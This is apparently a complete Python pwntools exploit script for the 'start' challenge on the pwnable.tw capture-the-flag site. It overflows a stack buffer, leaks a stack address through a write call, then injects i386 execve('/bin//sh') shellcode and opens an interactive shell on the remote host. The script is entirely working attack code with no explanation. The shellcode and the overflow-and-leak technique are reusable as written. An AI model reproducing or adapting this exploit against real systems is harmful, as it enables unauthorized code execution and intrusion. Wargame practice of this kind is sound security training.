from pwn import *
debug =  0
if debug:
	a = process('./start')
else:
	host = 'chall.pwnable.tw'
	port = 10000
	a = remote( host,port)

shell = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
writesys = 0x08048087

buff = 'a'*0x14 
buff += p32(writesys)

a.send(buff)
a.recvuntil("Let's start the CTF:")

leakadd = u32(a.recv(4))
shelladd = leakadd + 20
print "shelladd :%x" % shelladd
print "add leak: %x" % leakadd

a.recv(1024)

buff2 = 'a'*0x14 
buff2 += p32(shelladd)
buff2 += shell
a.sendline(buff2)
a.interactive()
